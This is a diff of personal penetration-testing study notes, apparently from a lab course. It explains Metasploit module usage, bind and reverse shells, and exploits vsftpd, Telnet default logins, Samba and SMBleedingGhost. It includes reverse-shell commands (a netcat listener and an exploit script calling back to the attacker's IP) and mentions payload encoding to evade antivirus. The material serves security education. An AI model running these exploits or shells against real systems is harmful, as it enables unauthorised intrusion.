@@ -89,71 +89,71 @@ logon to: https://kali:8834/ (port number might vary, but when starting the ness
 
 
 ____________________________________________________________________
-EXPLOITATION & GAINING ACCESS 
+EXPLOITATION 
 ____________________________________________________________________
 
 FEW IMPORTANT TERMINOLOGIES AND DEFS:
-	PAYLOAD : payload is the part of the private user text which could also contain malware such as worms or viruses which performs the malicious action
-	EXPLOIT: piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or vulnerability
-		TIP: the best analogy to understand the difference bet. exploit & payload is that an exploit is the way to create a pipeline and the payload is the script that's used to perform all sorts of stuffs in the target system using that pipeline
-	BIND SHELL : have the listener(basically it means opening a port so that a service runs in that port) running on the target and the attacker connect to the listener in order to gain a remote shell.(due to firewall, port opening restrictions might be present in target system, creating a bind shell might not work in some cases)
-	REVERSE SHELL : have the listener running on the attacker and the target connects to the attacker with a shell.(the target tries to connect to the attacker's specific open port)
+        PAYLOAD : payload is the part of the private user text which could also contain malware such as worms or viruses which performs the malicious action
+        EXPLOIT: piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or vulnerability
+                TIP: the best analogy to understand the difference bet. exploit & payload is that an exploit is the way to create a pipeline and the payload is the script that's used to perform all sorts of stuffs in the target system using that pipeline
+        BIND SHELL : have the listener(basically it means opening a port so that a service runs in that port) running on the target and the attacker connect to the listener in order to gain a remote shell.(due to firewall, port opening restrictions might be present in target system, creating a bind shell might not work in some cases)
+        REVERSE SHELL : have the listener running on the attacker and the target connects to the attacker with a shell.(the target tries to connect to the attacker's specific open port)
 
-(msfconsole)metasploit-framework-------------------------------------------------------------------------------------------------------------------------------------------------
-location in kali linux: /usr/share/metasploit-framework/
-some important files defs inside the above folder as follows:
-	msfconsole - to open the metasploit-framework in cmd
-	msfvenom - tool to generate payload/shell
-	modules/ - folder consisting of all frameworks in metasploit
-		exploits/ - program execute set of command in target machine to gain access like Buffer overflow, RCE etc
-		auxiliary/ - not a payload but performs actions like scanning(such as version, eg: bruteforce login panels for ssh), fuzzing, DOS attacks etc(sometimes used in first 2 stages of penetration testing)
-		post/ - as the name suggests post exploitation module that's usually used after successfully gaining access to the target device and get info such as files, hashes etc
-		payloads/ - some code that's delivered to target to exploit the target machine
-			singles/ - payloads that are standalone, eg: adding a user to the target system etc
-			stagers/ - setup a network connection between attacker and target system and designed to be small & reliable and done by shells(reverse, bind)[tcp & udp]
-			stages/ - payload components that are downloaded by stagers modules, can provide adv. feats. /w no size limits
-		encoders/ - helps evading anti virus detection(normally for us a payload's a script but for targets its a virus so this help to encode and make payloads less detectable by the antivirus)
-		evasion/ - pretty much the same as encoders/
-		nops/ - (no operation) instruction for the processor which means do nothing(useful to execute buffer overflow attacks) 
-
-TIP: (in msfconsole, we can also run normal linux cmds such as: ifconfig, ls, cd within without the help of opening another terminal)
-
-MSFCONSOLE BASIC CMDS, MODULE SELECTION AND AHEAD:(TO REM: the thing we do everytime in mfsc is use a module/ by selecting an exploit, then set options for the module/, the payload and the target and finally exploit!)
-> help (for help manual)
-> show payloads (list all available payloads present in /usr/share/metasploit-framework/ which shows columns such as number, name etc
-> show exploits (same as above but shows all exploits)
-> sessions (shows sessions that are initialized with target's machine)
-> use <name_from_the_show_list> (to use an exploit. Eg: use exploit/windows/smb/ms06_040_netapi)
-after the above module is selected to view all info/description about it:
-> show info (to view the code we can get to the msf location[/usr/share/metasploit-framework/] and get to the relative modules folder)
-we need to setup options for the module that we're gonna use, so the following cmd shows what all options are available to configure the specific module you've chosen
-> show options
-basically it shows 3 different options:
-	module options: options to setup the target's info such as ip_addr, port (RHOSTS,RPORT) etc
-	payload options: options to setup the attacker's system such as when creating a rev_tcp_shell we need to give attacker's ip, port (LHOST,LPORT) etc(basically it is setup already for us by msf itself)
-	exploit targets: shows all the vulnerable targets available predefined for the particular module/ selected(it could be a software or for a specific OS that's running in the target system) Eg: list of specific exploits for win10, win7 etc or in case a software it is by default no specialization takes place 
-to set an option the following cmd is used:
-> set <option_name> <value/s> (eg: set LHOST 192.168.1.15)
-we can again use "show options" to see if the value changed is set
-
-we can also change the payload but usually what msf gave as its best but sometimes it might not work.
-but still we can change the payload for a specifically selected module/ by listing the payloads using "show payloads" but this time only the possible payloads will be listed for that specific module/
-after that we can copy the name of the payload and type the foll. cmd:
-> set payload <payload_name> (make sure while setting a rev. or bind shell while setting the payload option,change respective ip_addr, ports (RHOST, LHOST, LPORT, RPORT) needs to be changed)
-to list all targets we can use "show targets" and to set use the foll. cmd:
-> set target <id_number>
-if no specific target info is known an "Automatic" option would be present in targets but only scopes within the known targets and not others. Eg: if targets are present for win10,win7, Automatic doesn't work out for winXP
-and finally to execute the setup we've did so far the foll. cmd is used:
-> exploit
-
-MSFCONSOLE OTHER MISC:
-to search a specific software service:
-> search <software_name>
+(msfconsole)metasploit-framework-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+|  location in kali linux: /usr/share/metasploit-framework/
+|  some important files defs inside the above folder as follows:
+|          msfconsole - to open the metasploit-framework in cmd
+|          msfvenom - tool to generate payload/shell
+|          modules/ - folder consisting of all follows in metasploit
+|                  exploits/ - program execute set of command in target machine to gain access like Buffer overflow, RCE etc
+|                  auxiliary/ - not a payload but performs actions like scanning(such as version, eg: bruteforce login panels for ssh), fuzzing, DOS attacks etc(sometimes used in first 2 stages of penetration testing)
+|                  post/ - as the name suggests post exploitation module that's usually used after successfully gaining access to the target device and get info such as files, hashes etc
+|                  payloads/ - some code that's delivered to target that allows attackers to steal information
+|                          singles/ - payloads that are standalone, eg: adding a user to the target system etc
+|                          stagers/ - setup a network connection between attacker and target system and designed to be small & reliable and done by shells(reverse, bind)[tcp & udp]
+|                          stages/ - payload components that are downloaded by stagers modules, can provide adv. feats. /w no size limits
+|                  encoders/ - helps evading anti virus detection(normally for us a payload's a script but for targets its a virus so this help to encode and make payloads less detectable by the antivirus)
+|                  evasion/ - pretty much the same as encoders/
+|                  nops/ - (no operation) instruction for the processor which means do nothing(useful to execute buffer overflow attacks) 
+|  
+|  TIP: (in msfconsole, we can also run normal linux cmds such as: ifconfig, ls, cd without the help of opening another terminal)
+|  
+|  MSFCONSOLE BASIC CMDS, MODULE SELECTION AND AHEAD:(TO REM: the thing we do everytime in mfsc is use a module/ by selecting an exploit, then set options for the module/, the payload and the target and finally exploit!)
+|  > help (for help manual)
+|  > show payloads (list all available payloads present in /usr/share/metasploit-framework/ which shows columns such as number, name etc
+|  > show exploits (same as above but shows all exploits)
+|  > sessions (shows sessions that are created with target's machine)
+|  > use <name_from_the_show_list> (to use an exploit. Eg: use exploit/windows/smb/ms06_040_netapi)
+|  after the above module is selected to view all info/description about it:
+|  > show info (to view the code we can get to the msf location[/usr/share/metasploit-framework/] and get to the related module folder)
+|  we need to setup options for the module that we're gonna use, so the following cmd shows what all options are available to configure the specific module you've chosen
+|  > show options
+|  basically it shows 3 different options:
+|          module options: options to setup the target's info such as ip_addr, port (RHOSTS,RPORT) etc
+|          payload options: options to setup the attacker's system such as when creating a rev_tcp_shell we need to give attacker's ip, port (LHOST,LPORT) etc(basically it is setup already for us by msf itself, but mods could be done)
+|          exploit targets: shows all the vulnerable targets available predefined for the particular module/ selected(it could be a software or for a specific OS that's running in the target system) Eg: list of specific exploits for win10, win7 etc or in case a software it is by default no specialization takes place 
+|  to set an option the following cmd is used:
+|  > set <option_name> <value/s> (eg: set LHOST 192.168.1.15)
+|  we can again use "show options" to see if the value changed is set
+|  
+|  we can also change the payload but usually what msf gives would be best but sometimes it might not work.
+|  but still we can change the payload for a specifically selected module/ by listing the payloads using "show payloads" but this time only the possible payloads will be listed for that specific module/(i.e. exploit)
+|  after that we can copy the name of the payload and type the foll. cmd:
+|  > set payload <payload_name> (make sure while setting a rev. or bind shell while setting the payload option,change respective ip_addr, ports (RHOST, LHOST, LPORT, RPORT))
+|  to list all targets we can use "show targets" and to set use the foll. cmd:
+|  > set target <id_number>
+|  if no specific target info is known an "Automatic" option would be present in targets but only scopes within the known targets and not others. Eg: if targets are present for win10,win7, Automatic won't work out for winXP
+|  and finally to execute the setup we've did so far the foll. cmd is used:
+|  > exploit (even 'run' cmd can be used[but for some specifics 'run' can only be used])
+|  
+|  MSFCONSOLE OTHER MISC:
+|  to search a specific software service:
+|  > search <software_name>
 
 [VIDEO (vsftpd - FIRST VULNERABILITY EXPLOITATION)] METASPLOITABLE 2.0
-	start scanning metasploitable VM using nmap (-sV) and 
-	then use searchsploit to search for the service /w version whether we have an exploit for that and check whether metasploit version of exploit is available
-	if its available goto metasploit and do "search <software_name>" and select the matching version with "use <exploit_loc>" and the above following steps as done
+        start scanning metasploitable VM using nmap (-sV) and 
+        then use searchsploit to search for the service /w version whether we have an exploit for that and check whether metasploit version of exploit is available
+        if its available goto metasploit and do "search <software_name>" and select the matching version with "use <exploit_loc>" and the following steps are done:
 Eg: Exploiting vsftpd 2.3.4
 > use exploit/unix/ftp/vsftpd_234_backdoor
 > set <params> <param_value>
@@ -166,7 +166,7 @@ eg: to connect to a service: nc <ip_addr> <port_number>
 
 [VIDEO (Telnet Exploitation - similar to above but with default username & password that's not changed)] METASPLOITABLE 2.0
 to access telnet in cmd:
-> telnet <ip_addr>
+> telnet <ip_addr> (asks for username and password. In our case both are: msfadmin)
 
 [VIDEO (Samba Exploitation - here we tend to find out the exact version of samba before exploiting)] METASPLOITABLE 2.0
 after scanning in nmap (-sV) we tend to find out the partial version of samba service but 
@@ -321,9 +321,9 @@ this repo consists of a .bat file that should be executed in target win10 machin
 now on executing the .bat file we get the offset result for the current win10 version that's running in the target machine
 we can now compare that with the offset that's present in the file named "SMBleedingGhost.py"
 if any of the 5 offsets are different we can change that similar to the target's offset in the script file(SMBleedingGhost.py)
-in your case the 4th and 5th offset are different so we set it similar to the target's offset
-as after exploiting the target's should connect to our listener so we need to open a port in the attacker's machine(basically we're creating a reverse shell)
-in order to do it we need netcat and we create it as follows:
+in our case the 4th and 5th offset are different so we set it similar to the target's offset
+after exploiting the target, it should connect to our listener so we need to open a port in the attacker's machine(basically we're creating a reverse shell)
+in order to do it we need netcat and run it as follows:
 > nc -lvp 4444 (attacker listening in port 4444)
 then the exploit(SMBleedingGhost.py) has to be executed from a windows OS and then redirect the connection to the attacker's kali linux machine to pop a shell as follows:
 > python3 SMBleedingGhost.py <target_ip> <listening_attacker_ip> <listener's_port_no.> (also the listening_attacker's PC could also be the windows machine but make sure netcat is installed to create a listening port)
@@ -339,3 +339,6 @@ For eg: (to run all exploits with the target router to check if it's vulnerable 
 after entering it scans whether it is vulnerable to any exploits
 TO DOWNLOAD: https://github.com/threat9/routersploit (to install check out the README.md in the git repo)
 FOR MORE: https://www.threat9.com/blog
+
+
+
